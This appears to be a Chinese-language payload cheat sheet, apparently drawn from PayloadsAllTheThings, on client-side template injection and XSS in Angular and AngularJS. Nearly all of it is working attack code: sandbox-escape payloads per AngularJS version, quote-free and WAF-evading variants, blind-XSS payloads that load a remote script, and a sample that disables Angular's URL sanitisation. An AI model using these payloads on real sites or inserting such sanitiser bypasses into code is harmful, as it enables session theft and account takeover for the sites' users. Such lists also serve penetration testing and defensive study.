# XSS Angular - Angular/AngularJS XSS漏洞

[SEARCH_KEYWORDS]
漏洞类型: XSS Angular AngularJS Client-Side Template Injection
攻击类型: Cross-Site Scripting Template Injection Sandbox Bypass
关键词: Angular AngularJS ng-app constructor $eval $on sandbox bypass
技术: CSTI Sandbox Escape DomSanitizer bypass bypassSecurityTrust
版本: AngularJS 1.0.x AngularJS 1.2.x AngularJS 1.3.x AngularJS 1.4.x AngularJS 1.5.x AngularJS 1.6+

[CONTENT]

## Angular XSS概述

Angular和AngularJS应用可能存在客户端模板注入(CSTI)漏洞，当用户输入被不安全地嵌入模板时可导致XSS。AngularJS 1.6+已移除沙箱，但早期版本存在多种沙箱绕过技术。

## 客户端模板注入

**前提**: 根元素必须存在`ng-app`指令

### AngularJS 1.6+

```javascript
{{constructor.constructor('alert(1)')()}}
{{[].pop.constructor('alert\u00281\u0029')()}}
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

### AngularJS 1.5.0 - 1.5.8

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### AngularJS 1.4.0 - 1.4.9

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
```

### AngularJS 1.3.20

```javascript
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
```

### AngularJS 1.3.3 - 1.3.18

```javascript
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charAt=[].join;
  $eval('x=alert(1)//');}}
```

### AngularJS 1.2.24 - 1.2.29

```javascript
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

### AngularJS 1.2.19 - 1.2.23

```javascript
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
```

### AngularJS 1.2.6 - 1.2.18

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

### AngularJS 1.0.1 - 1.1.5

```javascript
{{constructor.constructor('alert(1)')()}}
```

## 高级绕过

### 无引号绕过

```javascript
{{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

### 无引号和constructor字符串

```javascript
{{x=767015343;y=50986827;a=x.toString(36)+y.toString(36);b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,toString()[a].fromCharCode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

### WAF绕过 (Imperva)

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')}}
```

## Blind XSS

### 1.0.1 - 1.1.5 && > 1.6.0

```javascript
{{constructor.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()}}
```

### 简短版本

```javascript
{{$on.constructor("var _ = document.createElement('script');
    _.src='//localhost/m';
    document.getElementsByTagName('body')[0].appendChild(_)")()}}
```

## 自动清理绕过

Angular默认对所有值进行清理。但可使用以下方法绕过:

- `bypassSecurityTrustHtml`
- `bypassSecurityTrustScript`
- `bypassSecurityTrustStyle`
- `bypassSecurityTrustUrl`
- `bypassSecurityTrustResourceUrl`

**危险代码示例**:

```js
import { Component } from '@angular/core';

@Component({
  selector: 'my-app',
  template: `
    <p><a [href]="trustedUrl">Click me</a></p>
  `,
})
export class App {
  constructor(private sanitizer: DomSanitizer) {
    this.dangerousUrl = 'javascript:alert("Hi there")';
    this.trustedUrl = sanitizer.bypassSecurityTrustUrl(this.dangerousUrl);
  }
}
```

## 参考文档

原始来源: PayloadsAllTheThings/XSS Injection/5 - XSS in Angular.md